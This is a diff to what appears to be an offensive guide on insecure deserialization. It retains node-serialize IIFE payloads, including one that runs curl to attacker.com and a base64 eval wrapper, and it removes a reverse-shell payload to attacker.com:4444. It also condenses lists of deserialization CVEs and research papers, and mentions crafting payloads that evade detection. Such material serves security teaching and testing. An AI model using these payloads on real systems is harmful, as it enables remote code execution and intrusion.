@@ -218,9 +218,7 @@ deprecated it, but legacy applications and internal tools still use it.
 BinaryFormatter formatter = new BinaryFormatter();
 object obj = formatter.Deserialize(stream);
 
-// SoapFormatter / NetDataContractSerializer -- equally dangerous
-SoapFormatter soap = new SoapFormatter();
-NetDataContractSerializer ndcs = new NetDataContractSerializer();
+// SoapFormatter / NetDataContractSerializer -- equally dangerous, less common
 
 // LosFormatter -- used in ViewState
 LosFormatter los = new LosFormatter();
@@ -353,9 +351,6 @@ Appending `()` creates an IIFE that executes during deserialization.
 ```javascript
 // Trailing () causes immediate execution
 {"role":"_$$ND_FUNC$$_function(){require('child_process').execSync('curl http://attacker.com/cb')}()"}
-
-// Reverse shell
-{"rce":"_$$ND_FUNC$$_function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect(4444,'attacker.com',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);})}()"}
 
 // Base64-wrapped to avoid character issues
 {"p":"_$$ND_FUNC$$_function(){eval(Buffer.from('BASE64PAYLOAD','base64').toString())}()"}
@@ -592,22 +587,14 @@ Understanding defensive detection helps you craft payloads that avoid alerts.
 - Burp Deserialization Scanner (BApp Store)
 
 **Critical CVEs:**
-- CVE-2015-4852 -- WebLogic T3 deserialization (Commons Collections)
-- CVE-2017-7525 -- Jackson enableDefaultTyping RCE
-- CVE-2017-9805 -- Struts 2 REST plugin XStream deserialization
-- CVE-2018-1000861 -- Jenkins Stapler deserialization
-- CVE-2019-2725 -- WebLogic XMLDecoder deserialization
-- CVE-2019-6340 -- Drupal REST deserialization
-- CVE-2019-18935 -- Telerik UI .NET deserialization
-- CVE-2020-9484 -- Tomcat session persistence deserialization
-- CVE-2020-36188 -- Jackson-databind SSRF via JNDI
-- CVE-2021-21978 -- VMware View Planner deserialization
-- CVE-2023-34362 -- MOVEit Transfer deserialization chain
-- CVE-2023-46604 -- ActiveMQ ClassPathXmlApplicationContext RCE
+CVE-2015-4852 (WebLogic T3), CVE-2017-7525 (Jackson defaultTyping),
+CVE-2017-9805 (Struts 2 XStream), CVE-2018-1000861 (Jenkins Stapler),
+CVE-2019-2725 (WebLogic XMLDecoder), CVE-2019-6340 (Drupal REST),
+CVE-2019-18935 (Telerik UI .NET), CVE-2020-9484 (Tomcat session persistence),
+CVE-2020-36188 (Jackson SSRF via JNDI), CVE-2021-21978 (VMware View Planner),
+CVE-2023-34362 (MOVEit Transfer), CVE-2023-46604 (ActiveMQ RCE)
 
 **Research:**
-- "Marshalling Pickles" -- Frohoff and Lawrence (AppSecCali 2015)
-- "Friday the 13th: JSON Attacks" -- Munoz and Mirosh (BlackHat 2017)
-- "Are You My Type?" -- Munoz and Mirosh (exploiting .NET serializers)
-- OWASP Deserialization Cheat Sheet
-- PortSwigger Web Security Academy: Insecure Deserialization
+"Marshalling Pickles" (Frohoff/Lawrence, AppSecCali 2015), "Friday the 13th: JSON
+Attacks" (Munoz/Mirosh, BlackHat 2017), "Are You My Type?" (Munoz/Mirosh, .NET
+serializers), OWASP Deserialization Cheat Sheet, PortSwigger Insecure Deserialization.
